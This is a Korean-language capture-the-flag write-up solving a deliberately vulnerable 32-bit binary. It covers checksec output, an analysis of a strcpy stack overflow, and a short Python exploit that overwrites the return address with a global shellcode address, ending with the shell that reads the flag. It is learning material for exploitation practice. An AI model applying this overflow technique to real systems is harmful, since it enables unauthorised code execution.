#### 1. 문제에 적용된 보안기법 분석

```Shell
$ file basic  
basic: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=abd6e5690ca68cfa47c91046efe4e7b358bd904a, not stripped  

$ gdb -q basic
gdb-peda$ checksec basic
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

32비트 바이너리이고, 서버의 ASLR 이외에는 아무런 보안기법이 적용되어 있지 않습니다.
  
  
#### 2. 문제 분석

strcpy는 입력값의 길이에 제한없이 대상을 복사하기 때문에 Buffer Overflow가 일어나고, [NX](https://en.wikipedia.org/wiki/NX_bit)가 적용되어 있지 않기 때문에 우리는 shellcode를 사용할 수 있습니다.

서버에는 ASLR이 걸려있지만 전역변수로 선언된 shellcode라는 변수가 존재하므로 이걸 이용하여 쉘을 흭득하고 flag를 읽으면 됩니다. 이 전역변수의 주소는 고정값입니다.

또한 스택구조는 [ buffer[64] ][ 12 byte dummy ][ return address ] 와 같이 되므로 [ AAAA... AAA(76개) ][ shellcode 주소 ] 로 해주면 return address가 shellcode의 주소로 바뀌어 shellcode를 실행하게 되고 쉘을 얻게 됩니다 야호!
  
  
#### 3. 문제 풀이

우선 shellcode 변수의 주소를 얻어야 하는데... 여러가지 방법이 있겠지만 gdb를 사용하면 아주 쉽게 구할 수 있습니다.

```Shell
$ gdb -q basic
gdb-peda$ print &shellcode
$1 = (<data variable, no debug info> *) 0x804a024 <shellcode>
```

shellcode의 주소는 0x804a024 이군요!

필요한건 다 구했으니 공격해보도록 합시다

#### 4. Exploit Code
```Python
# exploit.py
from struct import pack
shellcode_addr = 0x804a024

payload = ""
payload+= "A"*64 # buffer size
payload+= "B"*12 # dummy
payload+= pack("<L", shellcode_addr) # return to shellcode, then we get the shell!

print payload
```

```Shell
./basic `python exploit.py`

Attack me and read the flag :)
$ cat flag
Jumping to the buff3r 0v3rFlow World :)
$ exit
```







